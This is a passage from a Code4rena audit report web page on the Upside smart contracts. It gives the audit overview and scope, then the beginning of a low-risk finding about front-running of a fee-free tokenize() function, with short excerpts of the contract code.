<!DOCTYPE html><html lang="en" class="dark __variable_145019 __variable_7d3254 __variable_38ceec"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/aa1e03632b0a9f00.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/9942e0cbde34320f.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-ee83ff9cf0b0c89c.js"/><script src="/_next/static/chunks/fd9d1056-eb8d5211d3c9c065.js" async=""></script><script src="/_next/static/chunks/2117-a3b19a97c1cb31ce.js" async=""></script><script src="/_next/static/chunks/main-app-3138c406eafafcb7.js" async=""></script><script src="/_next/static/chunks/2972-f84899d403fe0acb.js" async=""></script><script src="/_next/static/chunks/app/reports/error-337d8165658cb655.js" async=""></script><script src="/_next/static/chunks/da2599a7-883aa94cd391c09d.js" async=""></script><script src="/_next/static/chunks/aaea2bcf-7a609d2a8547b978.js" async=""></script><script src="/_next/static/chunks/c16f53c3-1c73b34d2bc72b67.js" async=""></script><script src="/_next/static/chunks/0815f603-89dbad4b5756c5c4.js" async=""></script><script src="/_next/static/chunks/5878-bdbba189b5f619d7.js" async=""></script><script src="/_next/static/chunks/1700-bbc1d97db9b9492c.js" async=""></script><script src="/_next/static/chunks/2636-173262633c516a97.js" async=""></script><script src="/_next/static/chunks/3504-22e800882144201d.js" async=""></script><script src="/_next/static/chunks/4105-30871074ad2edc9d.js" async=""></script><script src="/_next/static/chunks/6390-77d8d06791482011.js" async=""></script><script src="/_next/static/chunks/6686-dd6382cfde9e8708.js" async=""></script><script src="/_next/static/chunks/5813-7499623caf5cc29b.js" async=""></script><script src="/_next/static/chunks/1638-02441f876b022d5b.js" async=""></script><script src="/_next/static/chunks/191-db678ccd3d1e6084.js" async=""></script><script src="/_next/static/chunks/867-ac7b2edcc9aa90cf.js" async=""></script><script src="/_next/static/chunks/7834-0fb33076adf039e3.js" async=""></script><script src="/_next/static/chunks/app/layout-bd3ec2013b0d95b1.js" async=""></script><script src="/_next/static/chunks/app/not-found-c0beac80bd3674ca.js" async=""></script><script src="/_next/static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js" async=""></script><title>Code4rena | Keeping high severity bugs out of production</title><meta name="description" content="Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours."/><meta name="application-name" content="Code4rena | Keeping high severity bugs out of production"/><meta property="og:title" content="Code4rena"/><meta property="og:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."/><meta property="og:site_name" content="Code4rena"/><meta property="og:image" content="https://code4rena.com/images/c4/c4-og-v2.png"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Code4rena"/><meta name="twitter:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."/><meta name="twitter:image" content="https://code4rena.com/images/c4/c4-og-v2.png"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="256x256"/><link rel="icon" href="/logos/c4/c4-favicon-32.png"/><link rel="apple-touch-icon" href="/logos/c4/apple-touch-icon.png"/><meta name="next-size-adjust"/><title>Upside</title><meta property="og:title" content="Upside"/><meta name="twitter:title" content="Upside"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="wrapper__grid"><div class="Toastify"></div><!--$--><!--/$--><header class="header full-width--padded "><a class="visually-hidden focusable skip-link" href="#skip-link">Skip Navigation</a><nav aria-label="Desktop Navigation" class="header__nav"><a class="logo" href="/"><img alt="Code4rena Logo" loading="lazy" width="143" height="28" decoding="async" data-nimg="1" style="color:transparent" src="/logos/c4/c4-logo.svg"/></a><ul class="header__nav-links"><div class="header__nav-separator"></div><li><button class="header__nav-link__btn" aria-haspopup="true" aria-expanded="false" aria-controls="for_projects_submenu" type="button">For Projects<svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-secondary)" fill-rule="evenodd" clip-rule="evenodd" d="M4.7636 8.2636C5.11508 7.91213 5.68492 7.91213 6.0364 8.2636L10.9 13.1272L15.7636 8.2636C16.1151 7.91213 16.6849 7.91213 17.0364 8.2636C17.3879 8.61508 17.3879 9.18492 17.0364 9.5364L11.5364 15.0364C11.1849 15.3879 10.6151 15.3879 10.2636 15.0364L4.7636 9.5364C4.41213 9.18492 4.41213 8.61508 4.7636 8.2636Z"></path></g></svg></button><div class="submenu__wrapper"><div id="for_projects_submenu" aria-hidden="true" aria-label="For Projects Submenu" class="header__nav-links__dropdown"><div class="dropdown__promo_parent"><div class="dropdown__promo"><div class="dropdown__promo_text"><h2>Ready to secure your project?</h2><p>The best time to start is now.</p></div><div class="dropdown__promo_button"><a target="_blank" rel="noreferrer noopener" class="" tabindex="-1" href="https://go.code4rena.com/start?source=header-nav"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Get started (opens in new window)"><div class="marketing-btn__text">Get started</div><svg width="16px" height="16px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M10.6803 4.2636C11.0317 3.91213 11.6016 3.91213 11.953 4.2636L18.3697 10.6803C18.5385 10.8491 18.6333 11.078 18.6333 11.3167C18.6333 11.5554 18.5385 11.7843 18.3697 11.9531L11.953 18.3697C11.6016 18.7212 11.0317 18.7212 10.6803 18.3697C10.3288 18.0183 10.3288 17.4484 10.6803 17.0969L15.5605 12.2167H4.89998C4.40293 12.2167 3.99998 11.8137 3.99998 11.3167C3.99998 10.8196 4.40293 10.4167 4.89998 10.4167H15.5605L10.6803 5.5364C10.3288 5.18492 10.3288 4.61508 10.6803 4.2636Z"></path></g></svg></button></a></div></div></div><div class="dropdown__content"><div class="dropdown__content__wrapper"><strong class="content__label__decorated_full">Security solutions</strong><ul class="dropdown__content__col decorated_full"><li><a aria-label="Competitive audit" class="dropdown__content__link__decorated__full" href="/competitive-audit"><div><div class="dropdown__content__link__label">Competitive audit</div><p class="dropdown__content__link__description">We invented the format that disrupted the web3 industry. Find out why top protocols trust C4.</p></div></a></li><li><a aria-label="Zenith" class="dropdown__content__link__decorated__full" href="/zenith"><div><div class="dropdown__content__link__label">Zenith</div><p class="dropdown__content__link__description">Zenith assembles auditors with proven track records to secure your project.</p></div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Resources</strong><ul class="dropdown__content__col simple"><li><a target="_blank" rel="noreferrer noopener" aria-label="Docs (opens in new window)" href="https://docs.code4rena.com"><div class="dropdown__content__link__label">Docs</div></a></li><li><a aria-label="Reports" href="/reports"><div class="dropdown__content__link__label">Reports</div></a></li></ul></div></div></div></div></li><li><button class="header__nav-link__btn" aria-haspopup="true" aria-expanded="false" aria-controls="for_wardens_submenu" type="button">For Wardens<svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-secondary)" fill-rule="evenodd" clip-rule="evenodd" d="M4.7636 8.2636C5.11508 7.91213 5.68492 7.91213 6.0364 8.2636L10.9 13.1272L15.7636 8.2636C16.1151 7.91213 16.6849 7.91213 17.0364 8.2636C17.3879 8.61508 17.3879 9.18492 17.0364 9.5364L11.5364 15.0364C11.1849 15.3879 10.6151 15.3879 10.2636 15.0364L4.7636 9.5364C4.41213 9.18492 4.41213 8.61508 4.7636 8.2636Z"></path></g></svg></button><div class="submenu__wrapper"><div id="for_wardens_submenu" aria-hidden="true" aria-label="For Wardens Submenu" class="header__nav-links__dropdown"><div class="dropdown__promo_parent"><div class="dropdown__promo"><div class="dropdown__promo_text"><h2>Find bugs. Get paid.</h2><p>Put your security research skills to work.</p></div><div class="dropdown__promo_button"><a class="" tabindex="-1" href="/register/account"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Become a Warden"><div class="marketing-btn__text">Become a Warden</div><svg width="16px" height="16px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M10.6803 4.2636C11.0317 3.91213 11.6016 3.91213 11.953 4.2636L18.3697 10.6803C18.5385 10.8491 18.6333 11.078 18.6333 11.3167C18.6333 11.5554 18.5385 11.7843 18.3697 11.9531L11.953 18.3697C11.6016 18.7212 11.0317 18.7212 10.6803 18.3697C10.3288 18.0183 10.3288 17.4484 10.6803 17.0969L15.5605 12.2167H4.89998C4.40293 12.2167 3.99998 11.8137 3.99998 11.3167C3.99998 10.8196 4.40293 10.4167 4.89998 10.4167H15.5605L10.6803 5.5364C10.3288 5.18492 10.3288 4.61508 10.6803 4.2636Z"></path></g></svg></button></a></div></div></div><div class="dropdown__content"><div class="dropdown__content__wrapper"><strong class="content__label__simple">Audits</strong><ul class="dropdown__content__col simple"><li><a aria-label="Ongoing audits" href="/audits#active-audits"><div class="dropdown__content__link__label">Ongoing audits</div></a></li><li><a aria-label="Upcoming audits" href="/audits#upcoming-audits"><div class="dropdown__content__link__label">Upcoming audits</div></a></li><li><a aria-label="Past audits" href="/audits#completed-audits"><div class="dropdown__content__link__label">Past audits</div></a></li><li><a aria-label="Bounties" href="/bounties"><div class="dropdown__content__link__label">Bounties</div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Leaderboard</strong><ul class="dropdown__content__col simple"><li><a aria-label="Past 90 days" href="/leaderboard?timeframe=Last 90 days"><div class="dropdown__content__link__label">Past 90 days</div></a></li><li><a aria-label="Past 365 days" href="/leaderboard?timeframe=Last 365 days"><div class="dropdown__content__link__label">Past 365 days</div></a></li><li><a aria-label="All time" href="/leaderboard?timeframe=All time"><div class="dropdown__content__link__label">All time</div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Resources</strong><ul class="dropdown__content__col simple"><li><a aria-label="Reports" href="/reports"><div class="dropdown__content__link__label">Reports</div></a></li><li><a aria-label="Help desk" href="/help"><div class="dropdown__content__link__label">Help desk</div></a></li><li><a target="_blank" rel="noreferrer noopener" aria-label="Docs (opens in new window)" href="https://docs.code4rena.com"><div class="dropdown__content__link__label">Docs</div></a></li><li><a target="_blank" rel="noreferrer noopener" aria-label="GitHub (opens in new window)" href="https://github.com/code-423n4/"><div class="dropdown__content__link__label">GitHub</div></a></li></ul></div></div></div></div></li><li class="header__user-help__wrapper"><a class="header__user-help" href="/help">Support</a></li><li class="header__user-login__wrapper"><a class="header__user-login" href="/login">Log in</a></li><div class="login__mobile"><h2>Login</h2><a class="login__link" href="/login"><img alt="login icon" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="login__icon" style="color:transparent" src="/images/sign-out.svg"/>Log in / Register</a></div><a target="_blank" rel="noreferrer noopener" class="spacing-bottom__m spacing-left__s" tabindex="-1" href="https://go.code4rena.com/start?source=header-nav"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Get an audit (opens in new window)"><div class="marketing-btn__text">Get an audit</div></button></a></ul></nav><nav aria-label="Mobile Navigation" class="header__nav__mobile"><div class="header__logo-and-burger"><a class="logo" href="/"><img alt="Code4rena Logo" loading="lazy" width="143" height="28" decoding="async" data-nimg="1" style="color:transparent" src="/logos/c4/c4-logo.svg"/></a><div class="mobile__nav__wrapper"><div class="mobile__nav__overlay"></div><div id="c4_mobile_nav" class="mobile__nav__body" aria-hidden="true"></div></div><button class="hamburger" aria-label="Open menu" aria-expanded="false" aria-controls="c4_mobile_nav" type="button"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="menu"><g id="Vector"><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 10.7333C2.99988 10.2362 3.40282 9.83325 3.89988 9.83325H18.5665C19.0636 9.83325 19.4665 10.2362 19.4665 10.7333C19.4665 11.2303 19.0636 11.6333 18.5665 11.6333H3.89988C3.40282 11.6333 2.99988 11.2303 2.99988 10.7333Z"></path><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 5.23325C2.99988 4.7362 3.40282 4.33325 3.89988 4.33325H18.5665C19.0636 4.33325 19.4665 4.7362 19.4665 5.23325C19.4665 5.73031 19.0636 6.13325 18.5665 6.13325H3.89988C3.40282 6.13325 2.99988 5.73031 2.99988 5.23325Z"></path><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 16.2333C2.99988 15.7362 3.40282 15.3333 3.89988 15.3333H18.5665C19.0636 15.3333 19.4665 15.7362 19.4665 16.2333C19.4665 16.7303 19.0636 17.1333 18.5665 17.1333H3.89988C3.40282 17.1333 2.99988 16.7303 2.99988 16.2333Z"></path></g></g></svg></button></div></nav><span id="skip-link"></span></header><main><div class="report-page"><div class="limited-width type__copy"><div class="type__article"><div class="logo-64"><img alt="Upside" loading="lazy" decoding="async" data-nimg="fill" class="rounded" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="80px" srcSet="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=3840&amp;q=75"/></div><div class="report-header"><h1>Upside<!-- --> <br/> Findings &amp; Analysis Report</h1><h4>2025-06-08</h4></div><div class="report-container"><h2>Table of contents</h2><div class="report-toc markdown-body"><ul>
<li>
<p><a href="#overview">Overview</a></p>
<ul>
<li><a href="#about-c4">About C4</a></li>
</ul>
</li>
<li><a href="#summary">Summary</a></li>
<li><a href="#scope">Scope</a></li>
<li><a href="#severity-criteria">Severity Criteria</a></li>
<li>
<p><a href="#low-risk-and-non-critical-issues">Low Risk and Non-Critical Issues</a></p>
<ul>
<li><a href="#01-front-running-attack-in-tokenize-function">01 Front-running attack in tokenize function</a></li>
<li><a href="#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner">02 Transferring ownership may result in fees being unintentionally paid to the previous owner</a></li>
<li><a href="#03-swap-fee-bypass-via-small-trade-amounts">03 Swap fee bypass via small trade amounts</a></li>
</ul>
</li>
<li><a href="#disclosures">Disclosures</a></li>
</ul></div><div class="report-contents markdown-body"><h1 style="position:relative;" id="overview"><a class="anchor before" aria-label="overview permalink" href="#overview"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Overview</h1>
<h2 style="position:relative;" id="about-c4"><a class="anchor before" aria-label="about c4 permalink" href="#about-c4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>About C4</h2>
<p>Code4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.</p>
<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>
<p>During the audit outlined in this document, C4 conducted an analysis of the Upside smart contract system. The audit took place from May 19 to May 26, 2025.</p>
<p>Final report assembled by Code4rena.</p>
<h1 style="position:relative;" id="summary"><a class="anchor before" aria-label="summary permalink" href="#summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Summary</h1>
<p>The C4 analysis yielded an aggregated total of 0 High and Medium vulnerabilities. Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. </p>
<p>All of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Upside team.</p>
<h1 style="position:relative;" id="scope"><a class="anchor before" aria-label="scope permalink" href="#scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Scope</h1>
<p>The code under review can be found within the <a href="https://github.com/code-423n4/2025-05-upside">C4 Upside repository</a>, and is composed of 2 smart contracts written in the Solidity programming language and includes 379 lines of Solidity code.</p>
<h1 style="position:relative;" id="severity-criteria"><a class="anchor before" aria-label="severity criteria permalink" href="#severity-criteria"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Criteria</h1>
<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>
<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>
<ul>
<li>Malicious Input Handling</li>
<li>Escalation of privileges</li>
<li>Arithmetic</li>
<li>Gas use</li>
</ul>
<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href="https://code4rena.com">the C4 website</a>, specifically our section on <a href="https://docs.code4rena.com/awarding/judging-criteria/severity-categorization">Severity Categorization</a>.</p>
<h1 style="position:relative;" id="low-risk-and-non-critical-issues"><a class="anchor before" aria-label="low risk and non critical issues permalink" href="#low-risk-and-non-critical-issues"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Low Risk and Non-Critical Issues</h1>
<p>For this audit, 27 reports were submitted by wardens detailing low risk and non-critical issues. The <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-609">report highlighted below</a> by <strong>Brene</strong> received the top score from the judge.</p>
<p><em>The following wardens also submitted reports: <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-238">0xcb90f054</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-373">0xhp9</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-117">0xozovehe</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-594">Anyasaa</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-502">befree3x</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-680">c0pp3rscr3w3r</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-420">CasinoCompiler</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-226">dobrevaleri</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-396">dystopia</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-251">eLSeR17</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-115">farismaulana</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-287">harry</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-465">hgrano</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-648">Jamil</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-171">K42</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-618">MrPotatoMagic</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-243">peppef</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-517">PolarizedLight</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-434">rayss</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-423">ret2basic</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-436">Roger</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-454">SafetyBytes</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-547">sakibcy</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-203">Sakursf</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-353">Tigerfrake</a>, and <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-407">vaminator</a>.</em></p>
<h2 style="position:relative;" id="01-front-running-attack-in-tokenize-function"><a class="anchor before" aria-label="01 front running attack in tokenize function permalink" href="#01-front-running-attack-in-tokenize-function"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[01] Front-running attack in tokenize function</h2>
<p><a href="https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159">https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159</a></p>
<h3 style="position:relative;" id="finding-description"><a class="anchor before" aria-label="finding description permalink" href="#finding-description"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>tokenize()</code> function in the <code>UpsideProtocol</code> contract allows users to tokenize the provided <code>url</code>. A critical parameter governing this process is <code>tokenizeFeeEnabled</code>, which determines whether users must pay a fee in order to call the function. When this flag is set to <code>false</code>, users can freely call <code>tokenize()</code> without paying any fee.</p>
<p>This design introduces a significant front-running risk. Since the function can be called without restriction or cost when fees are disabled, malicious actors can monitor pending transactions in the mempool and submit the same <code>tokenize()</code> call with a higher gas price to get their transaction mined first.
Once the second user successfully tokenizes the provided URL, the contract sets a mapping entry for that URL:</p>
<pre data-index="0" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">urlToMetaCoinMap</span><span class="mtk1">[</span><span class="mtk12">_url</span><span class="mtk1">] = </span><span class="mtk12">metaCoinAddress</span><span class="mtk1">;</span></span></span></code></pre>
<p>This causes <code>urlToMetaCoinMap[_ur]</code> to be non-zero. Therefore, when user1â€™s transaction is eventually mined, the following check fails:</p>
<pre data-index="1" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">urlToMetaCoinMap</span><span class="mtk1">[</span><span class="mtk12">_url</span><span class="mtk1">] != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">MetaCoinExists</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span></code></pre>
